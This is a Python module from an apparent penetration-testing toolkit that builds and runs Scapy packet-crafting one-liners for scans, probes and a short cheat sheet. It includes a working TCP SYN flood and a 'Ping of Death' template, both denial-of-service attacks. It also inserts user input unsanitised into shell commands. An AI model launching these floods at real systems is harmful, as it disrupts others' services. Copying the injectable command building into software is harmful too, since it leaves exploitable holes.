"""Packet Crafter Module - Custom TCP/UDP/ICMP/ARP packet construction via Scapy."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "packet_craft"

# Scapy one-liner templates
SCAPY_TEMPLATES = {
    "ICMP Ping": {
        "desc": "Send ICMP echo request",
        "cmd": 'python3 -c "from scapy.all import *; ans=sr1(IP(dst=\\"{target}\\")/ICMP(), timeout=3); print(ans.summary() if ans else \'No response\')"',
        "params": ["target"],
    },
    "TCP SYN": {
        "desc": "Send TCP SYN to specific port",
        "cmd": 'python3 -c "from scapy.all import *; ans=sr1(IP(dst=\\"{target}\\")/TCP(dport={port},flags=\\"S\\"), timeout=3); print(ans.summary() if ans else \'No response\')"',
        "params": ["target", "port"],
    },
    "TCP SYN Scan": {
        "desc": "SYN scan multiple ports",
        "cmd": 'python3 -c "from scapy.all import *; ans,unans=sr(IP(dst=\\"{target}\\")/TCP(dport=[{ports}],flags=\\"S\\"), timeout=2); ans.summary()"',
        "params": ["target", "ports"],
    },
    "UDP Packet": {
        "desc": "Send UDP packet with payload",
        "cmd": 'python3 -c "from scapy.all import *; send(IP(dst=\\"{target}\\")/UDP(dport={port})/Raw(load=\\"{payload}\\"))"',
        "params": ["target", "port", "payload"],
    },
    "ARP Request": {
        "desc": "Send ARP who-has request",
        "cmd": 'python3 -c "from scapy.all import *; ans=srp1(Ether(dst=\\"ff:ff:ff:ff:ff:ff\\")/ARP(pdst=\\"{target}\\"), timeout=3); print(ans.summary() if ans else \'No response\')"',
        "params": ["target"],
    },
    "DNS Query": {
        "desc": "Craft DNS query",
        "cmd": 'python3 -c "from scapy.all import *; ans=sr1(IP(dst=\\"{dns_server}\\")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=\\"{domain}\\")), timeout=3); print(ans.summary() if ans else \'No response\')"',
        "params": ["dns_server", "domain"],
    },
    "Ping of Death": {
        "desc": "Oversized ICMP packet (testing only)",
        "cmd": 'python3 -c "from scapy.all import *; send(IP(dst=\\"{target}\\")/ICMP()/Raw(load=\\"A\\"*65500))"',
        "params": ["target"],
    },
    "Christmas Tree": {
        "desc": "TCP packet with all flags set (XMAS scan)",
        "cmd": 'python3 -c "from scapy.all import *; ans=sr1(IP(dst=\\"{target}\\")/TCP(dport={port},flags=\\"FPU\\"), timeout=3); print(ans.summary() if ans else \'No response (port open or filtered)\')"',
        "params": ["target", "port"],
    },
    "Traceroute": {
        "desc": "ICMP traceroute via Scapy",
        "cmd": 'python3 -c "from scapy.all import *; ans,unans=sr(IP(dst=\\"{target}\\",ttl=(1,30))/ICMP(), timeout=2); ans.summary()"',
        "params": ["target"],
    },
}


def _template_attack(session):
    """Run a pre-built Scapy template."""
    options = [(str(i+1), f"[bold]{name}[/bold] - {t['desc']}") for i, (name, t) in enumerate(SCAPY_TEMPLATES.items())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    templates = list(SCAPY_TEMPLATES.items())
    if idx < 0 or idx >= len(templates):
        error("Invalid choice.")
        return

    name, template = templates[idx]
    info(f"Selected: {name} — {template['desc']}")

    # Collect parameters
    params = {}
    for param in template["params"]:
        if param == "ports":
            val = ask(f"Enter {param} (comma-separated, e.g., 22,80,443)")
        elif param == "payload":
            val = ask(f"Enter {param} (text string)")
        else:
            val = ask(f"Enter {param}")
        if not val:
            error(f"{param} is required.")
            return
        params[param] = val

    cmd = template["cmd"].format(**params)
    run_with_preview(cmd, session, STAGE)


def _syn_flood(session):
    """TCP SYN flood (stress testing)."""
    warning("[!] SYN flood is a denial-of-service attack. Use only on authorized targets!")
    if not confirm("Continue with SYN flood?"):
        return

    target = ask("Enter target IP")
    port = ask("Enter target port", default="80")
    count = ask("Number of packets", default="1000")

    cmd = f'python3 -c "from scapy.all import *; send(IP(dst=\\"{target}\\")/TCP(dport={port},flags=\\"S\\",sport=RandShort()), count={count}, verbose=False); print(\'Sent {count} SYN packets\')"'
    run_with_preview(cmd, session, STAGE)


def _custom_scapy(session):
    """Open interactive Scapy shell or run custom one-liner."""
    options = [
        ("1", "[bold]Interactive shell[/bold] - Open Scapy REPL"),
        ("2", "[bold]One-liner[/bold]         - Run custom Scapy command"),
    ]
    choice = show_menu(options)

    if choice == "1":
        info("Starting Scapy shell... (type exit() to quit)")
        run_with_preview("scapy", session, STAGE)
    elif choice == "2":
        code = ask("Enter Scapy Python code")
        if code:
            cmd = f'python3 -c "from scapy.all import *; {code}"'
            run_with_preview(cmd, session, STAGE)


def _pcap_craft(session):
    """Create and save crafted packets to PCAP file."""
    target = ask("Enter target IP")
    outfile = ask("Output PCAP file", default="/tmp/crafted.pcap")
    count = ask("Number of packets to craft", default="10")

    cmd = f'python3 -c "from scapy.all import *; pkts=[IP(dst=\\"{target}\\")/TCP(dport=RandShort(),flags=\\"S\\") for _ in range({count})]; wrpcap(\\"{outfile}\\", pkts); print(f\\"Wrote {count} packets to {outfile}\\")"'
    run_with_preview(cmd, session, STAGE)


def _cheat_sheet():
    """Scapy cheat sheet."""
    content = """# Scapy Packet Crafting Cheat Sheet

## Basics
```python
from scapy.all import *

# Build packets layer by layer
pkt = IP(dst="target")/TCP(dport=80,flags="S")
pkt = Ether()/IP()/TCP()  # With Ethernet header

# Send & receive
send(pkt)              # Layer 3 send (no response)
sr1(pkt)               # Send & receive one response
sr(pkt)                # Send & receive all responses
srp(pkt)               # Layer 2 send & receive

# Sniff
sniff(count=10, filter="tcp port 80")
sniff(prn=lambda x: x.summary())
```

## Common Recipes
```python
# Port scan
sr(IP(dst="target")/TCP(dport=(1,1024),flags="S"))

# ARP scan
srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"))

# Traceroute
sr(IP(dst="target",ttl=(1,30))/ICMP())

# DNS query
sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=1,qd=DNSQR(qname="target.com")))

# Save/read PCAP
wrpcap("file.pcap", packets)
pkts = rdpcap("file.pcap")
```

## TCP Flags
- S = SYN, A = ACK, F = FIN, R = RST
- P = PSH, U = URG, E = ECE, C = CWR

## Install
```
pip3 install scapy
```
"""
    show_knowledge(content)


def run(session):
    """Packet Crafter module entry point."""
    show_stage_header("Packet Crafter", "Custom packet construction with Scapy — TCP, UDP, ICMP, ARP, DNS")

    while True:
        options = [
            ("1", "[bold]Packet Templates[/bold] - Pre-built Scapy recipes"),
            ("2", "[bold]SYN Flood[/bold]        - TCP SYN flood (stress test)"),
            ("3", "[bold]Custom Scapy[/bold]     - Interactive shell / one-liner"),
            ("4", "[bold]Craft to PCAP[/bold]    - Build packets & save to file"),
            ("5", "[bold]Cheat Sheet[/bold]      - Scapy reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _template_attack(session)
        elif choice == "2":
            _syn_flood(session)
        elif choice == "3":
            _custom_scapy(session)
        elif choice == "4":
            _pcap_craft(session)
        elif choice == "5":
            _cheat_sheet()
